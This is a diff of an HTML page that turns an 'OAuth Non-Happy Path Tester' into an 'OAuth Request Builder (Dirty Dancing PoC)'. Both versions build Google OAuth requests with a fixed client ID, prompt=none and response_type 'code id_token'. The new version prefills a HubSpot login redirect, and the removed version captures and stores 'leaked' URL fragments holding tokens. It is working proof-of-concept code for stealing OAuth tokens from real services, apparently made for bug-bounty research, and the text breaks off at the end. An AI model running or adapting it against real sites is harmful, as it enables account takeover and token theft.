@@ -1,61 +1,72 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OAuth Tester</title>
+  <meta charset="UTF-8">
+  <title>OAuth PoC Builder</title>
+  <style>
+    body { font-family: Arial; padding: 20px; }
+    input, select { display: block; margin-bottom: 10px; width: 400px; padding: 5px; }
+    button { padding: 10px 15px; }
+  </style>
 </head>
 <body>
 
-    <h3>OAuth Non-Happy Path Tester</h3>
+<h2>OAuth Request Builder (Dirty Dancing PoC)</h2>
 
-    <label>Target callback URL:</label><br>
-    <input type="text" id="target" size="80"
-        placeholder="https://target.com/api/v1/oauth/google/callback/login">
-    <br><br>
+<label>Client ID</label>
+<input id="client_id" value="466680526474.apps.googleusercontent.com">
 
-    <input type="button" value="Exploit" onclick="exploit()">
+<label>Redirect URI</label>
+<input id="redirect_uri" value="https://app.hubspot.com/login/googleLoginRedirect">
 
-    <pre id="output"></pre>
+<label>Response Type</label>
+<input id="response_type" value="code id_token">
 
-    <script>
-        function exploit() {
-            const target = document.getElementById("target").value.trim();
+<label>Scope</label>
+<input id="scope" value="email profile">
 
-            if (!target) {
-                alert("Insert target callback URL");
-                return;
-            }
+<label>Prompt</label>
+<input id="prompt" placeholder="none / consent / select_account">
 
-            const encodedRedirect = encodeURIComponent(target);
+<label>State</label>
+<input id="state" placeholder="ATTACK or URL">
 
-            const url = "https://accounts.google.com/o/oauth2/auth?" +
-                "client_id=466680526474.apps.googleusercontent.com" +
-                "&redirect_uri=" + encodedRedirect +
-                "&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email" +
-                "&state=ATTACK" +
-                "&response_type=code%20id_token" +
-                "&prompt=none" +
-                "&nonce=TEST123";
+<label>Nonce</label>
+<input id="nonce" placeholder="random">
 
-            window.open(url, "_blank", "width=500,height=600");
-        }
+<button onclick="launch()">Launch OAuth</button>
 
-        // Capture fragment if it ever comes back to YOUR page
-        window.addEventListener('load', () => {
-            const fragment = window.location.hash;
+<script>
+function launch() {
+  const params = new URLSearchParams();
 
-            if (fragment) {
-                console.log("Leaked fragment:", fragment);
+  const client_id = document.getElementById("client_id").value;
+  const redirect_uri = document.getElementById("redirect_uri").value;
+  const response_type = document.getElementById("response_type").value;
+  const scope = document.getElementById("scope").value;
+  const prompt = document.getElementById("prompt").value;
+  const state = document.getElementById("state").value;
+  const nonce = document.getElementById("nonce").value;
 
-                document.getElementById("output").innerText =
-                    "Leaked fragment:\n" + fragment;
+  if (client_id) params.set("client_id", client_id);
+  if (redirect_uri) params.set("redirect_uri", redirect_uri);
+  if (response_type) params.set("response_type", response_type);
+  if (scope) params.set("scope", scope);
+  if (prompt) params.set("prompt", prompt);
+  if (state) params.set("state", state);
+  if (nonce) params.set("nonce", nonce);
 
-                // Optional: persist locally
-                localStorage.setItem("leak", fragment);
-            }
-        });
-    </script>
+  // defaults for testing
+  if (!state) params.set("state", "POC_" + Math.random());
+  if (!nonce && response_type.includes("id_token")) {
+    params.set("nonce", "TEST_" + Math.random());
+  }
 
-</body>
-</html>
+  const url = "https://accounts.google.com/o/oauth2/auth?" + params.toString();
+
+  console.log("Redirecting to:", url);
+  window.location = url;
+}
+</script>
+
+</b
